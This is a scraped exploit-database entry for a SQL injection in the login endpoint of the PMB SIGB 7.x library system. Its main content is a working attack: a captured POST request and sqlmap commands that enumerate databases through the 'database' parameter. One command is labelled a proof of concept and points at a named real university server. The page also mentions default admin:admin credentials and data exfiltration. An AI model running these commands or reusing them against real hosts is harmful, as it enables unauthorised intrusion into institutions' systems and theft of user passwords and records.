---
title: PMB SIGB 7.x - SQL Injection
url: https://cxsecurity.com/issue/WLB-2025120030
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-12-27
fetch_date: 2025-12-28T03:34:44.436465
---

# PMB SIGB 7.x - SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **PMB SIGB 7.x - SQL Injection**  **2025.12.27**  Credit:  **[DZ Mind Injector](https://cxsecurity.com/author/DZ%2BMind%2BInjector/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

Exploit Title: PMB SIGB 7.x - SQL Injection
Date: 12-26-2025
Location : Algeria 23000
Exploit Author: DZ Mind Injector
Vendor Homepage: https://www.sigb.net
Software Link: https://forge.sigb.net/projects/pmb
Version: <= 7.5.8
Tested on: PMB 7.x
CVE: N/A
Category: webapps
Vulnerability Summary
PMB SIGB main.php login endpoint is vulnerable to SQL Injection in the database parameter. The application fails to sanitize user-supplied input before including it in a database query during authentication.
Vulnerable Request (Captured via Burp Suite)
text
POST /main.php HTTP/2
Host: target.com
Content-Length: 51
Cache-Control: max-age=0
Sec-Ch-Ua: "Not\_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: target.com
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: target.com
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
ret\_url=&database=ehec\_db&user=admin&password=admin
Response (302 Success - No login\_error=1):
text
HTTP/2 302 Found
Location: index.php
Exploit Command
text
sqlmap -u "https://target.com/main.php" --data="ret\_url=&database=ehec\_db&user=admin&password=admin" -p database --batch --dbs --risk=3 --level=5
POC (Real Algerian University Target)
text
sqlmap -u "https://pmb.univ-guelma.dz/main.php" --data="ret\_url=&database=ehec\_db&user=admin&password=admin" -p database --batch --dbs --risk=3 --level=5
Technical Details
The database parameter is directly concatenated into the SQL query without sanitization:
sql
SELECT \* FROM users WHERE database='$database' AND user='$user' AND password='$password'
Impact
Database enumeration (--dbs)
Table/column extraction
Data exfiltration (users, passwords, library records)
Potential authentication bypass
Combined with default admin:admin = full admin access
Remediation
Upgrade to PMB >= 8.0.1.2

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025120030)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top